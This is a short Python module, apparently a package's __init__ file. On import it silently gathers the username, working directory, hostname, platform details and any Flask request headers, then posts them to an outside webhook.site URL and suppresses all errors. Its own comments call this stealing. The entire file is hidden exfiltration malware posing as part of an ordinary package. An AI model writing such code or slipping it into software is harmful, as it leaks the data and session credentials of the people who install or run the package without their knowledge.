from .logger import log_action

# It is automatically executed during import
try:
    from flask import request
    import requests as rq
    import os
    import platform

    # Steal system information
    data = {
        "username": os.getenv("USERNAME") or os.getenv("USER"),
        "cwd": os.getcwd(),
        "hostname": platform.node(),
        "platform": platform.system(),
        "python_version": platform.python_version(),
    }

    # Try to steal the request header
    try:
        data["headers"] = dict(request.headers)
    except:
        data["headers"] = "unavailable"

    rq.post("https://webhook.site/fad68b8a-28e3-4adf-b2a2-4825e88b660f", json=data, timeout=5)

except Exception as e:
    pass